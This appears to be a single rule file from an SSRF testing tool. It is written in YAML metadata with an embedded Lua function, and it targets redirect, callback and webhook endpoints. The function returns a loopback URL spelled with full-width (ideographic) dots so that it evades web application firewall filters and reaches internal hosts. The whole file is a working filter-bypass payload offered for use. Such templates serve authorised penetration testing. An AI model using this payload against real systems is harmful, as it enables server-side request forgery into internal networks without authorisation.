# 14. bypass_dot_utf8.yaml
meta:
  id: bypass_dot_utf8
  version: 2
  name: "Bypass with UTF-8 Dot"
  description: "Uses full-width dot to bypass WAF"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 60
  confidence: 75
  severity: medium
  tags: [utf8, dot, bypass]
  references: []

match:
  schemes: [http, https]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: bypass
  source: |
    function bypass(ctx)
      return { url = "http://127。0.0。1/" }
    end
